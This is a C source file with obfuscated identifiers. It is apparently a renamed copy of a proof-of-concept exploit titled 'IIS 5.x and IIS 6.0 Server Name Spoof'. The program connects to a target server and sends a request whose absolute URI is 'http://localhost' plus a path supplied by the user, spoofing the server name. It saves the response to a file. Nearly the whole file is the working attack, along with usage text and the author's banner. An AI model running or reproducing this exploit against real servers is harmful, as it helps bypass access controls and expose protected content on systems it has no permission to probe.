
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int FILE ;


 int VAR_0 ;
 int VAR_1 ;
 int FUNC_0 () ;
 scalar_t__ FUNC_1 (char*) ;
 int FUNC_2 (int *) ;
 int * FUNC_3 (char*,char*) ;
 int FUNC_4 (char*,int *) ;
 int FUNC_5 (char*,...) ;
 size_t FUNC_6 (int,char*,int,int ) ;
 int FUNC_7 (int,char*,int ,int ) ;
 int FUNC_8 (char*,char*) ;
 int FUNC_9 (char*,char*) ;
 int FUNC_10 (char*) ;

int FUNC_11(int VAR_2, char *VAR_3[])
{

 int FUNC_12(char *VAR_4, short VAR_5);

 int VAR_6;

 char VAR_7[VAR_1];
 FILE *VAR_8;

 FUNC_5("\n                 Proof of Concept");
 FUNC_5("\n IIS 5.x and IIS 6.0 Server Name Spoof - by Lympex");
 FUNC_5("\nContact: lympex[at]gmail[dot]com - http://l-bytes.tk");
 FUNC_5("\n----------------------------------------------------\n");

 if(VAR_2!=4)
 {
  FUNC_5("\n[+] Usage: %s server.com 80 /test.asp\n",VAR_3[0]);return;
 }


 VAR_6=FUNC_12(VAR_3[1],(short)FUNC_1(VAR_3[2]));

 if(VAR_6==-1)
 {
  FUNC_5("\n[+] Error connecting to host\n");
  return;
 }FUNC_5("\n[+] Connected!\n");

 if((VAR_8=FUNC_3("received_data.txt","w"))==((void*)0))
 {
  FUNC_5("\n[+] Error saving received data\n");
  FUNC_0();
  return;
 }


 FUNC_9(VAR_7,"GET http://localhost");FUNC_8(VAR_7,VAR_3[3]);FUNC_8(VAR_7," HTTP/1.0\n\n");
 FUNC_7(VAR_6,VAR_7,FUNC_10(VAR_7),0);


 do
 {
  VAR_7[FUNC_6(VAR_6,VAR_7,VAR_1,0)]='\0';
  FUNC_4(VAR_7,VAR_8);
 }while(VAR_6==VAR_0);

 FUNC_0();
 FUNC_2(VAR_8);
 FUNC_5("\n[+] Received data, saved in: \x22received_data.txt\x22\n");
 return;
}
